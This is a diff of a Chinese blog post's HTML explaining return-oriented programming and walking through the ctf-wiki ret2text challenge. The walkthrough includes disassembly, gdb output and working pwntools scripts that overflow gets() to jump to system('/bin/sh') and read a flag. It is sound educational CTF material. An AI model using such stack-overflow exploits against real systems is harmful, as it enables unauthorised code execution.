@@ -14,12 +14,12 @@
     <link rel="shortcut icon" href="/images/icon.png">
   
 
-  <meta name="description" content="Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。">
+  <meta name="description" content="Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1.">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Basic ROP Learning">
 <meta property="og:url" content="http://fishcanf1y.github.io/2025/04/19/Basic-ROP-Learning/index.html">
 <meta property="og:site_name" content="fishcanf1y&#39;s Blog">
-<meta property="og:description" content="Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。">
+<meta property="og:description" content="Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。 1.">
 <meta property="og:locale" content="zh_CN">
 <meta property="article:published_time" content="2025-04-19T05:55:32.000Z">
 <meta property="article:modified_time" content="2025-06-27T12:28:39.439Z">
@@ -28,7 +28,7 @@
 <meta name="twitter:card" content="summary">
   <meta name="generator" content="Hexo 7.3.0">
   <script type="application/ld+json">
-{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://fishcanf1y.github.io/2025/04/19/Basic-ROP-Learning/"},"headline":"Basic ROP Learning","description":"Basic-ROP-LearningROP(Return-Oriented Programming)概述ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小","datePublished":"2025-04-19T05:55:32.000Z","dateModified":"2025-06-27T12:28:39.439Z","author":{"@type":"Person","name":"fishcanf1y"},"publisher":{"@type":"Organization","name":"fishcanf1y's Blog","logo":{"@type":"ImageObject","url":"http://fishcanf1y.github.io/images/icon.png"}}}
+{"@context":"https://schema.org","@type":"BlogPosting","mainEntityOfPage":{"@type":"WebPage","@id":"http://fishcanf1y.github.io/2025/04/19/Basic-ROP-Learning/"},"headline":"Basic ROP Learning","description":"Basic-ROP-Learning ROP(Return-Oriented Programming)概述 ROP(Return-Oriented Programming)是一种高级的代码复用攻击技术，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在栈缓冲区溢出的基础上，利用程序中已有的小片段 ","datePublished":"2025-04-19T05:55:32.000Z","dateModified":"2025-06-27T12:28:39.439Z","author":{"@type":"Person","name":"fishcanf1y"},"publisher":{"@type":"Organization","name":"fishcanf1y's Blog","logo":{"@type":"ImageObject","url":"http://fishcanf1y.github.io/images/icon.png"}}}
 </script>
 
   
@@ -150,31 +150,43 @@
   <div class="sea-doc">
     
     <div class="sea-article-content">
-      <h2 id="Basic-ROP-Learning"><a href="#Basic-ROP-Learning" class="headerlink" title="Basic-ROP-Learning"></a>Basic-ROP-Learning</h2><h2 id="ROP-Return-Oriented-Programming-概述"><a href="#ROP-Return-Oriented-Programming-概述" class="headerlink" title="ROP(Return-Oriented Programming)概述"></a>ROP(Return-Oriented Programming)概述</h2><p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP&#x2F;NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
-<h3 id="1-基本概念"><a href="#1-基本概念" class="headerlink" title="1. 基本概念"></a>1. <strong>基本概念</strong></h3><h4 id="（1）产生背景"><a href="#（1）产生背景" class="headerlink" title="（1）产生背景"></a>（1）产生背景</h4><ul>
-<li><p><strong>DEP&#x2F;NX防护</strong>：现代系统禁止执行栈&#x2F;堆上的代码（数据执行保护）。</p>
+      <h2 id="basic-rop-learning">Basic-ROP-Learning</h2>
+<h2 id="rop-return-oriented-programming-概述">ROP(Return-Oriented Programming)概述</h2>
+<p>ROP(Return-Oriented Programming)是一种高级的<strong>代码复用攻击技术</strong>，主要用于绕过现代操作系统的安全防护机制（如DEP/NX）。其核心思想是在<strong>栈缓冲区溢出的基础上，利用程序中已有的小片段 (gadgets) 来改变某些寄存器或者变量的值，从而控制程序的执行流程。</strong></p>
+<h3 id="1-基本概念">1. <strong>基本概念</strong></h3>
+<h4 id="1-产生背景">（1）产生背景</h4>
+<ul>
+<li>
+<p><strong>DEP/NX防护</strong>：现代系统禁止执行栈/堆上的代码（数据执行保护）。</p>
 </li>
-<li><p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p>
+<li>
+<p><strong>ASLR防护</strong>：随机化内存布局，增加预测难度。</p>
 </li>
-<li><p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p>
+<li>
+<p><strong>ROP应对方案</strong>：复用已有代码（<code>.text</code>段），避免直接注入shellcode。</p>
 </li>
 </ul>
 <span id="more"></span>
-<h4 id="（2）核心原理"><a href="#（2）核心原理" class="headerlink" title="（2）核心原理"></a>（2）核心原理</h4><ul>
-<li><p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p>
+<h4 id="2-核心原理">（2）核心原理</h4>
+<ul>
+<li>
+<p><strong>Gadget</strong>：以<code>ret</code>指令结尾的短指令序列（如<code>pop eax; ret</code>）。</p>
 </li>
-<li><p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成”代码链”。</p>
+<li>
+<p><strong>链式调用</strong>：通过精心构造栈帧，使<code>ret</code>指令跳转到下一个gadget，形成&quot;代码链&quot;。</p>
 </li>
 </ul>
 <hr>
-<h3 id="2-关键组件"><a href="#2-关键组件" class="headerlink" title="2. 关键组件"></a>2. <strong>关键组件</strong></h3><table>
+<h3 id="2-关键组件">2. <strong>关键组件</strong></h3>
+<table>
 <thead>
 <tr>
 <th>组件</th>
 <th>作用</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><strong>Gadget</strong></td>
 <td>程序中原有的短指令序列（通常以<code>ret</code>结尾），实现基本操作（如读写寄存器）。</td>
 </tr>
@@ -184,41 +196,49 @@
 </tr>
 <tr>
 <td><strong>Stack Pivot</strong></td>
-<td>将栈指针（ESP&#x2F;RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td>
+<td>将栈指针（ESP/RSP）转移到攻击者控制的内存区域（如堆），便于构造链。</td>
 </tr>
-</tbody></table>
+</tbody>
+</table>
 <hr>
-<h3 id="3-攻击步骤"><a href="#3-攻击步骤" class="headerlink" title="3. 攻击步骤"></a>3. <strong>攻击步骤</strong></h3><ol>
-<li><p><strong>信息泄露</strong></p>
+<h3 id="3-攻击步骤">3. <strong>攻击步骤</strong></h3>
+<ol>
+<li>
+<p><strong>信息泄露</strong></p>
 <ul>
 <li>获取内存地址（绕过ASLR），如通过格式化字符串漏洞泄露libc基址。</li>
 </ul>
 </li>
-<li><p><strong>寻找Gadgets</strong></p>
+<li>
+<p><strong>寻找Gadgets</strong></p>
 <ul>
 <li>使用工具（如<code>ROPgadget</code>、<code>ropper</code>）扫描二进制文件，收集可用gadgets。</li>
 </ul>
 </li>
-<li><p><strong>构造ROP Chain</strong></p>
+<li>
+<p><strong>构造ROP Chain</strong></p>
 <ul>
 <li>组合gadgets实现目标功能（如调用<code>system(&quot;/bin/sh&quot;)</code>）。</li>
 </ul>
 </li>
-<li><p><strong>触发漏洞</strong></p>
+<li>
+<p><strong>触发漏洞</strong></p>
 <ul>
 <li>通过栈溢出等漏洞覆盖返回地址，跳转到第一个gadget。</li>
 </ul>
 </li>
 </ol>
 <hr>
-<h3 id="4-防御措施"><a href="#4-防御措施" class="headerlink" title="4. 防御措施"></a>4. <strong>防御措施</strong></h3><table>
+<h3 id="4-防御措施">4. <strong>防御措施</strong></h3>
+<table>
 <thead>
 <tr>
 <th>防御技术</th>
 <th>原理</th>
 </tr>
 </thead>
-<tbody><tr>
+<tbody>
+<tr>
 <td><strong>ASLR</strong></td>
 <td>随机化内存布局，增加gadget地址预测难度。</td>
 </tr>
@@ -231,50 +251,50 @@
 <td>控制流完整性（Control-Flow Integrity），限制跳转目标仅为合法地址。</td>
 </tr>
 <tr>
-<td><strong>PIC&#x2F;PIE</strong></td>
+<td><strong>PIC/PIE</strong></td>
 <td>位置无关代码，增强ASLR效果。</td>
 </tr>
-</tbody></table>
-<h3 id="5-实例-Linux-x86-ROP-Exploit"><a href="#5-实例-Linux-x86-ROP-Exploit" class="headerlink" title="5.实例 Linux x86 ROP Exploit"></a>5.实例 Linux x86 ROP Exploit</h3><h5 id="1-ret2text"><a href="#1-ret2text" class="headerlink" title="(1) ret2text"></a>(1) ret2text</h5><ul>
-<li><h4 id="基本分析"><a href="#基本分析" class="headerlink" title="基本分析"></a><strong>基本分析</strong></h4></li>
+</tbody>
+</table>
+<h3 id="5-实例-linux-x86-rop-exploit">5.实例 Linux x86 ROP Exploit</h3>
+<h5 id="1-ret2text">(1) ret2text</h5>
+<ul>
+<li>
+<h4 id="基本分析"><strong>基本分析</strong></h4>
+</li>
 </ul>
 <p><a target="_blank" rel="noopener" href="https://github.com/ctf-wiki/ctf-challenges/raw/master/pwn/stackoverflow/ret2text/bamboofox-ret2text/ret2text">点击下载: ret2text</a></p>
 <p>先看看程序的保护机制</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">~ checksec ret2text</span><br><span class="line">[*] <span class="string">&#x27;/ret2text&#x27;</span></span><br><span class="line">    Arch:       i386-32-little</span><br><span class="line">    RELRO:      Partial RELRO</span><br><span class="line">    Stack:      No canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x8048000)</span><br><span class="line">    Stripped:   No</span><br><span class="line">    Debuginfo:  Yes</span><br></pre></td></tr></table></figure>
-
 <p>可以看出程序是 32 位程序，且仅开启了栈不可执行保护。接下来我们使用 IDA 反编译该程序：</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">char</span> s[<span class="number">100</span>]; <span class="comment">// [esp+1Ch] [ebp-64h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">setvbuf</span>(stdout, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">setvbuf</span>(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;There is something amazing here, do you know anything?&quot;</span>);</span><br><span class="line">  <span class="built_in">gets</span>(s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Maybe I will tell you next time !&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
 <p>我们可以看到，程序在<code>main</code>函数使用了很可疑的<code>gets</code>，那程序中就存在栈溢出漏洞，我们回到IDA看反汇编代码</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0</span>80485FD secure          proc near</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD input           = dword ptr <span class="number">-10</span>h</span><br><span class="line">.text:<span class="number">0</span>80485FD secretcode      = dword ptr <span class="number">-0</span>Ch</span><br><span class="line">.text:<span class="number">0</span>80485FD</span><br><span class="line">.text:<span class="number">0</span>80485FD ; __unwind &#123;</span><br><span class="line">.text:<span class="number">0</span>80485FD                 push    ebp</span><br><span class="line">.text:<span class="number">0</span>80485FE                 mov     ebp, esp</span><br><span class="line">.text:<span class="number">0</span>8048600                 sub     esp, <span class="number">28</span>h</span><br><span class="line">.text:<span class="number">0</span>8048603                 mov     dword ptr [esp], <span class="number">0</span> ; timer</span><br><span class="line">.text:<span class="number">0</span>804860A                 call    _time</span><br><span class="line">.text:<span class="number">0</span>804860F                 mov     [esp], eax      ; seed</span><br><span class="line">.text:<span class="number">0</span>8048612                 call    _srand</span><br><span class="line">.text:<span class="number">0</span>8048617                 call    _rand</span><br><span class="line">.text:<span class="number">0</span>804861C                 mov     [ebp+secretcode], eax</span><br><span class="line">.text:<span class="number">0</span>804861F                 lea     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048622                 mov     [esp<span class="number">+4</span>], eax</span><br><span class="line">.text:<span class="number">0</span>8048626                 mov     dword ptr [esp], offset unk_8048760</span><br><span class="line">.text:<span class="number">0</span>804862D                 call    ___isoc99_scanf</span><br><span class="line">.text:<span class="number">0</span>8048632                 mov     eax, [ebp+input]</span><br><span class="line">.text:<span class="number">0</span>8048635                 cmp     eax, [ebp+secretcode]</span><br><span class="line">.text:<span class="number">0</span>8048638                 jnz     <span class="type">short</span> locret_8048646</span><br><span class="line">.text:<span class="number">0</span>804863A                 mov     dword ptr [esp], offset command ; <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line">.text:<span class="number">0</span>8048641                 call    _system </span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p>在<code>secure</code>函数中我们看到了存在调用<code>system(&quot;/bin/sh&quot;)</code>，那我们的思路就是只能能覆盖到这个地址(即<code>0x0804863A</code>)上就可以拿到shell了，现在再来确定我们能够控制的内存的起始地址距离<code>main</code> 函数的返回地址的字节数。</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.text:<span class="number">0</span>80486A7                 lea     eax, [esp<span class="number">+80</span>h+s]</span><br><span class="line">.text:<span class="number">0</span>80486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:<span class="number">0</span>80486AE                 call    _gets</span><br><span class="line">.text:<span class="number">0</span>80486B3                 mov     dword ptr [esp], offset format ; <span class="string">&quot;Maybe I will tell you next time !&quot;</span></span><br><span class="line">.text:<span class="number">0</span>80486BA                 call    _printf</span><br><span class="line">.text:<span class="number">0</span>80486BF                 mov     eax, <span class="number">0</span></span><br><span class="line">.text:<span class="number">0</span>80486C4                 leave</span><br></pre></td></tr></table></figure>
-
 <p>用gef调试看看，现在<code>call _gets</code>的地址处下断点，然后run一下</p>
 <figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">~ <span class="function">gdb ret2text</span></span><br><span class="line"><span class="function">GNU <span class="title">gdb</span> <span class="params">(Ubuntu <span class="number">12.1</span><span class="number">-0u</span>buntu1~<span class="number">22.04</span><span class="number">.2</span>)</span> 12.1</span></span><br><span class="line"><span class="function"><span class="title">Copyright</span> <span class="params">(C)</span> 2022 Free Software Foundation, Inc.</span></span><br><span class="line"><span class="function">gef➤ b *0x080486AE </span></span><br><span class="line"><span class="function">Breakpoint 1 at 0x80486ae: file ret2text.c, line <span class="number">24.</span> </span></span><br><span class="line"><span class="function">gef➤ r </span></span><br><span class="line"><span class="function">There is something amazing here, do you know anything? Breakpoint <span class="number">1</span>, <span class="number">0x080486ae</span> in main () at ret2text.c:<span class="number">24</span></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function">[ Legend: Modified register | Code | Heap | Stack | String ]</span></span><br><span class="line"><span class="function">─────────────────────────────────────────────────────────────────────────────────────────────── registers ────</span></span><br><span class="line"><span class="function">$eax   : <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebx   : <span class="number">0xf7fac000</span>  →  <span class="number">0x00229dac</span></span></span><br><span class="line"><span class="function">$ecx   : <span class="number">0xf7fad9b4</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$edx   : <span class="number">0x1</span></span></span><br><span class="line"><span class="function">$esp   : <span class="number">0xffffcf50</span>  →  <span class="number">0xffffcf6c</span>  →  <span class="number">0xf7fc66d0</span>  →  <span class="number">0x0000000e</span></span></span><br><span class="line"><span class="function">$ebp   : <span class="number">0xffffcfd8</span>  →  <span class="number">0xf7ffd020</span>  →  <span class="number">0xf7ffda40</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$esi   : <span class="number">0xffffd094</span>  →  <span class="number">0xffffd1fc</span>  →  <span class="string">&quot;/home/explorer/CTF-Challenge/Pwn/linux/user-mode/s[...]&quot;</span></span></span><br><span class="line"><span class="function">$edi   : <span class="number">0xf7ffcb80</span>  →  <span class="number">0x00000000</span></span></span><br><span class="line"><span class="function">$eip   : <span class="number">0x080486ae</span>  →  &lt;main<span class="number">+0066</span>&gt; call <span class="number">0x8048460</span> &lt;gets@plt&gt;</span></span><br><span class="line"><span class="function">$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]</span></span><br><span class="line"><span class="function">$cs: <span class="number">0x23</span> $ss: <span class="number">0x2b</span> $ds: <span class="number">0x2b</span> $es: <span class="number">0x2b</span> $fs: <span class="number">0x00</span> $gs: <span class="number">0x63</span></span></span><br></pre></td></tr></table></figure>
-
 <ul>
-<li><h4 id="栈内存布局分析"><a href="#栈内存布局分析" class="headerlink" title="栈内存布局分析"></a><strong>栈内存布局分析</strong></h4></li>
+<li>
+<h4 id="栈内存布局分析"><strong>栈内存布局分析</strong></h4>
+</li>
 </ul>
-<p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c &#x3D; 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p>
+<p><code>buf</code>地址：<code>0xffffcd5c</code>(因为它是由 <code>eax</code> 和 <code>esp</code> 指向)，<code>ebp</code> 是 <code>0xffffcdc8</code>，而 <code>buf</code> 在 <code>0xffffcd5c</code>，两者距离为：0xffffcdc8 - 0xffffcd5c = 0x6c (108 字节), 因此，输入 108 字节后即可覆盖返回地址。</p>
 <ul>
-<li><h4 id="验证猜想"><a href="#验证猜想" class="headerlink" title="验证猜想"></a><strong>验证猜想</strong></h4>通过我们上面的分析可以构造以下payload:</li>
+<li>
+<h4 id="验证猜想"><strong>验证猜想</strong></h4>
+<p>通过我们上面的分析可以构造以下payload:</p>
+</li>
 </ul>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * <span class="number">108</span> + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>得到以下输出，想想是哪里出了问题呢？</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">~ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1593</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> ![*] Got EOF <span class="keyword">while</span> reading <span class="keyword">in</span> interactive</span><br><span class="line">$ <span class="built_in">ls</span></span><br><span class="line">[*] Process <span class="string">&#x27;./ret2text&#x27;</span> stopped with <span class="built_in">exit</span> code -11 (SIGSEGV) (pid 1593)</span><br><span class="line">[*] Got EOF <span class="keyword">while</span> sending <span class="keyword">in</span> interactive</span><br></pre></td></tr></table></figure>
-
 <p>在此，笔者需要做一个小提示，在某些情况下，寄存器会占用栈空间（后续会专门发文详述），而在32位情况下。我们的<code>ebp</code>占用了4字节，所以正确的偏移地址应该是：</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">总偏移 = buf 到 EBP 的距离 (0x6c) + EBP 自身大小 (4) = 0x70 (112)</span><br></pre></td></tr></table></figure>
-
 <p>因此，正确的payload是：</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line"><span class="comment"># sh.sendline(b&#x27;A&#x27; * (108+4) + p32(target))</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> *(<span class="number">108</span>+<span class="number">4</span>) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
-
 <p>输出如下：</p>
 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">explorer@DESKTOP-JPMNN21:~/CTF-Challenge/Pwn/linux/user-mode/stackoverflow/x86/basic-rop$ python3 exp.py</span><br><span class="line">[+] Starting <span class="built_in">local</span> process <span class="string">&#x27;./ret2text&#x27;</span>: pid 1766</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, <span class="keyword">do</span> you know anything?</span><br><span class="line">Maybe I will tell you next <span class="keyword">time</span> !$ <span class="built_in">ls</span></span><br><span class="line">exp.py  flag  ret2text</span><br><span class="line">$ <span class="built_in">cat</span> flag</span><br><span class="line">flag&#123;This_is_the_right_payload&#125;</span><br><span class="line">$</span><br><span class="line">[*] Interrupted</span><br><span class="line">[*] Stopped process <span class="string">&#x27;./ret2text&#x27;</span> (pid 1766)</span><br></pre></td></tr></table></figure>
-
 <p>不断更新，敬请期待！</p>
 <script src="https://giscus.app/client.js"
         data-repo="solkatt-cn/solkatt-cn.github.io"
